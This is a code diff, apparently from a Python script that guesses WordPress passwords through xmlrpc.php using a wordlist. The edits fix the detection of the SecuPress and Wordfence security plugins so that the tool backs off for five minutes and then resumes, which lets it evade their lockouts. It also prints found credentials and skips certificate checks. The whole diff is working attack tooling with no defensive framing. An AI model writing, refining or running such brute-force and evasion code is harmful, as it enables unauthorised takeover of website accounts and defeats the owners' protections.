@@ -86,10 +86,10 @@ def main(url, wordlist, user, time_sleep, u_agent):
                     print(req.text)
                 time.sleep(float(time_sleep))
                 print(d)
-                #print(req.text)
+                #print(req.text)#DEBUG
                 if "Incorrect" in req.text or "incorrect" in req.text:
                     pass
-                elif any(req.text in wa for wa in words_alert):
+                elif any(wa in req.text for wa in words_alert):
                     print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
                     timer(300)
                 elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
@@ -98,7 +98,7 @@ def main(url, wordlist, user, time_sleep, u_agent):
                 else:
                     if admin_page:
                         res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
-                        if any(req.text in wa for wa in words_alert):
+                        if any(wa in req.text for wa in words_alert):
                             print("{} SecuPress / Wordfence actived, wait 5 min...\n".format(LESS))
                             timer(300)
                         else:
@@ -131,7 +131,7 @@ def main(url, wordlist, user, time_sleep, u_agent):
                     print("{}:{}".format(u, d))
                     if "Incorrect" in req.text or "incorrect" in req.text:
                         pass
-                    elif any(req.text in wa for wa in words_alert):
+                    elif any(wa in req.text for wa in words_alert):
                         timer(300)
                     elif "503 Service Temporarily Unavailable" in req.text or req.status_code == 503:
                         print("{} Service seem Temporarily Unavailable, wait 5 min...\n".format(LESS))
@@ -139,7 +139,7 @@ def main(url, wordlist, user, time_sleep, u_agent):
                     else:
                         if admin_page:
                             res = requests.get(url.replace('xmlrpc.php', admin_page), verify=False)
-                            if [wa for wa in words_alert] in req.text:
+                            if any(wa in req.text for wa in words_alert):
                                 print("{} SecuPress actived, wait 5 min...\n".format(LESS))
                                 timer(300)
                             else:
